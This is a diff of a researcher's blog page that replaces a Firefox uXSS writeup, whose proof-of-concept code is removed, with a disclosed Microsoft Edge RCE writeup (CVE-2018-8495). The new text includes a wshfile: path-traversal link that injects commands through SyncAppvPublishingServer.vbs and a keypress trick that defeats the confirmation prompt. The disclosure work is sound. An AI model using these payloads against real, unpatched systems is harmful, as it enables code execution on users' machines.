@@ -1,15 +1,17 @@
 <!doctype html>
 <html>
 <head>
-	<title>Firefox uXSS and CSS XSS - Abdulrahman Al-Qabandi</title>
+	<title>Microsoft Edge RCE - (CVE-2018-8495) - Abdulrahman Al-Qabandi</title>
 	<link href="../q.css?q2" rel="stylesheet">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="https://leucosite.com/" />
 <meta name="twitter:title" content="Edge RCE" />
 <meta name="twitter:creator" content="@qab">
-<meta name="twitter:description" content="Chaining small bugs together to achieve RCE" />
+<meta name="twitter:description" content="(CVE-2018-8495) Chaining small bugs together to achieve RCE" />
 <meta name="twitter:image" content="https://leucosite.com/qimg/Art17.png" />
-<style>#qWriteup p{white-space: pre-wrap;}</style>
+<style>#qWriteup p{white-space: pre-wrap;}
+	code{background-color:#cccccc;}
+</style>
 </head>
 <body>
 <div id="qLogo"><img src="../q.png"/> 
@@ -26,7 +28,7 @@
 <h1>Microsoft Edge Remote Code Execution</h1>
 <br>
 
-<p>Chaining a few bugs in Edge I was able to achieve remote code execution by mainly abusing custom URI schemes.</p>
+<p> (CVE-2018-8495) Chaining a few bugs in Edge I was able to achieve remote code execution by mainly abusing custom URI schemes.</p>
 
 <h2>Launching External Applications</h2>
 <p>Many of you are probably aware that within the browser one can launch the default mail client by having a user go to a URL that looks like <code>'mailto:test@test.test'</code>. A prompt will appear asking the user whether to switch applications, once a user agrees, the application will run.
@@ -62,47 +64,76 @@ First, we get a prompt asking to choose the default application that should hand
 Pressing <code>'OK'</code> yields the following:
 
 <img src="../qimg/Art17-sub6.png"/>
+
+What <code>'WScript.exe'</code> does is it attempts to execute the file located in the path you pass to it. In this case, it tried to locate <code>'C:\WINDOWS\system32\wshfile:test'</code> but it does not exist.
+So what can we do about this? Can we somehow drop a file that's named <code>'wshfile:test'</code>? Nope. So what can we do?
 </p>
-<h2>Turning it into uXSS</h2>
-<p>One of the interesting behaviors of context menus is that once you open it, it will persist once you navigate to a different website. What's weirder is that if you, for example, open the context menu from <code>'a.com'</code> and then the browser redirects to <code>'b.com'</code>, you will notice that when you click on <code>View source</code> it will open <code>'view-source:b.com'</code> which is the current window.
+<h2>Exploitation</h2>
+<p>The first test here is obvious: path traversal. I simply navigated to <code>'wshfile:test/../../foo.vbs'</code>, pressed OK on the prompt and then:
+<img src="../qimg/Art17-sub7.png"/>
 
-So, even though you open the context menu, it will execute on whatever website you are on despite origin. So to set this up, we ask a user to click a button that opens the cross origin 'victim' website. After that, we will redirect to our website populating navigation history with our target website. Finally, we listen to when a user opens the context menu using <code>'oncontextmenu'</code> and execute <code>'history.back()'</code> taking us to the target website. Once the user clicks <code>View background image</code> javascript is executed. Interestingly, this acts like a bookmark which means it bypasses CSP and noscript (a non-JS PoC can be done.)
+Awesome! We can now point to any file in any directory and so long as we can drop a file in a predictable location, we will have RCE. But that is easier said than done, looked like most if not all cached files from Edge go into a salted directory location. In other words, we could plant files but we can't predict their location. 
 
-<b>xssSetup.html</b> (I am using <code>https://addons.mozilla.org/%00 to get a relatively quicker loding page, not required.)
-<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #007700">&lt;button</span> <span style="color: #0000CC">id=</span><span style="background-color: #fff0f0">&quot;qbutt&quot;</span><span style="color: #007700">&gt;</span>click me<span style="color: #007700">&lt;/button&gt;</span>
-
-<span style="color: #007700">&lt;script&gt;</span>
-<span style="color: #008800; font-weight: bold">var</span> qwin;
-
-qbutt.onclick<span style="color: #333333">=</span>e<span style="color: #333333">=&gt;</span>{
-	qwin<span style="color: #333333">=</span>open(<span style="background-color: #fff0f0">&#39;https://addons.mozilla.org/%00&#39;</span>,<span style="background-color: #fff0f0">&#39;qab&#39;</span>);
-	
-	setTimeout(<span style="color: #008800; font-weight: bold">function</span>(){
-		open(<span style="background-color: #fff0f0">&#39;imgXss.html&#39;</span>,<span style="background-color: #fff0f0">&#39;qab&#39;</span>)
-	},<span style="color: #0000DD; font-weight: bold">1000</span>)
-}
-<span style="color: #007700">&lt;/script&gt;</span>
-</pre></div>
-
+This is where I remembered an <a href="https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/" target="_blank">awesome article</a> written by <a href="https://twitter.com/enigma0x3" target="_blank">Matt Nelson</a>. In this article he points out that Windows comes with a signed VBS located in <code>'C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs'</code> that suffers from 'WSH Injection'. I highly recommend you read it, it essentially shows that the specific VBS file accepts 2 arguments passed to it and these arguments can be crafted as such that it would trick the VBS script into executing arbitrary commands. But! This was fixed already and the only affected computers are the ones that haven't updated yet. So that's not good enough, the article mentions that many more such cases exist but did not specify, thus begins my search for a similar case.
 <br>
-<b>imgXss.html</b>
-<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #007700">&lt;style&gt;</span><span style="color: #333333">*</span>{<span style="color: #008800; font-weight: bold">background-image</span><span style="color: #333333">:</span><span style="color: #DD2200; background-color: #fff0f0">url(&#39;javascript:alert(location)</span><span style="color: #FF0000; background-color: #FFAAAA">&#39;</span>)}<span style="color: #007700">&lt;/style&gt;</span>
+I started by looking at every single VBS file I could find in Windows and then looking if it accepts any parameters. I found one located at 
 
-<span style="color: #007700">&lt;b&gt;</span> Right click, wait for redirection then click &#39;view background image&#39;<span style="color: #007700">&lt;/b&gt;</span>
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">&#39;C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17134.48_none_c60426fea249fc02\SyncAppvPublishingServer.vbs&#39; 
+</pre></div><br>
 
-<span style="color: #007700">&lt;script&gt;</span>
-<span style="color: #007020">window</span>.oncontextmenu<span style="color: #333333">=</span>e<span style="color: #333333">=&gt;</span>{
-	setTimeout(<span style="background-color: #fff0f0">&quot;history.back()&quot;</span>,<span style="color: #0000DD; font-weight: bold">100</span>)
-}
-<span style="color: #007700">&lt;/script&gt;</span>
+
+This specific script takes in a few arguments and passes them into a powershell.exe shell execution without filtering it, allowing us to inject arbitrary commands. If you look at line 36 of 'SyncAppvPublishingServer.vbs' we see:
+<br><br>
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">psCmd = <span style="background-color: #fff0f0">&quot;powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &amp;{&quot;</span> &amp; syncCmd &amp; <span style="background-color: #fff0f0">&quot;}&quot;</span>
 </pre></div>
 <br>
-<b>Video:</b>
-<br><video loop="" controls><source type="video/mp4" src="//i.imgur.com/SiNadrn.mp4"></video><br>
-Mozilla swiftly fixed this issue and so it no longer works. But it sure was a fun find.
+And we can influence the value of <code>'syncCmd'</code> but not only that, Edge also does not sanitize quotation marks, so we can pass as many parameters to <code>'WScript.exe'</code> as we want. Again, conveniently this powershell will run hidden as indicated by <code>'-WindowStyle Hidden'</code> which makes this a perfect WSH injection vector. 
+<br><br>
+
+The problem in this version is that this specific folder name depends on what windows build the user is on. In my OS build 17134 the folder contains '10.0.17134' if you were on a different OS build it will be different. As far as the other things, there is little to no documentation of how they are determined. <a href="https://blogs.msdn.microsoft.com/jonwis/2005/12/28/whats-that-awful-directory-name-under-windowswinsxs/" target="_blank">This is the only article I found about it with any useful information.</a>
+<br><br>
+I made the argument in my report that all we needed was a stepping stone vulnerability in Edge that allowed us to detect local files (not read them), I was not able to find such a bug but hypothetically it can popup at any moment. On top of that, we don't have to guess the entire folder name char by char. In Windows folders come with a shorthand version called "DOS PATH" and so guessing the DOS path version of the folder location is more than possible.
+<br><br>
+Instead of trying to guess:
+<br><br>
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">&#39;C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17134.48_none_c60426fea249fc02\SyncAppvPublishingServer.vbs&#39; 
+</pre></div>
+<br>
+We can guess:
+<br>
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">&#39;C:\Windows\WinSxS\AMD921~1.48_\SyncAppvPublishingServer.vbs&#39;
+</pre></div>
+<br>
+
+So this makes my argument even stronger. Since both of these point to the exact same file.
+<br><br>
+But wait, what about that pesky prompt that appears? No user would be fooled into clicking 'OK' and run Windows Script Host! Thankfully when this prompt appears, the default focus is on the 'OK' button which means all the user has to do is hold down enter key and we can trick them into accepting the prompt.
+
 </p>
+<h2>Finally</h2>
+<p>
+The final proof of concept is as follows:
+
+<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #007700">&lt;a</span> <span style="color: #0000CC">id=</span><span style="background-color: #fff0f0">&quot;q&quot;</span> <span style="color: #0000CC">href=</span><span style="background-color: #fff0f0">&#39;wshfile:test/../../WinSxS/AMD921~1.48_/SyncAppvPublishingServer.vbs&quot; test test;calc;&quot;&#39;</span><span style="color: #007700">&gt;</span>test<span style="color: #007700">&lt;/a&gt;</span>
+<span style="color: #007700">&lt;script&gt;</span>
+<span style="color: #007020">window</span>.onkeydown<span style="color: #333333">=</span>e<span style="color: #333333">=&gt;</span>{
+	<span style="color: #007020">window</span>.onkeydown<span style="color: #333333">=</span>z<span style="color: #333333">=</span>{};
+	q.click()
+}
+<span style="color: #007700">&lt;/script&gt;</span>
+</pre></div><br><br>
+
+..and the a video of it in action:
+<br><br>
+<video loop="" controls=""><source type="video/mp4" src="https://i.imgur.com/hxQPl85.mp4"></video>
+<br><br>
+
+This was my first time reporting through ZDI and I must say that it is a breath of fresh air. The fact that I did not have to deal with vendors directly was a big plus, as I could focus on other things.
+
+</p>
+
 <h2>References:</h2>
-<b>The report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1465160" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1465160</a>
+<p><b>ZDI Advisory:</b> <a href="https://www.zerodayinitiative.com/advisories/ZDI-18-1136/" target="_blank">https://www.zerodayinitiative.com/advisories/ZDI-18-1136/</a>
 </p>
 
 
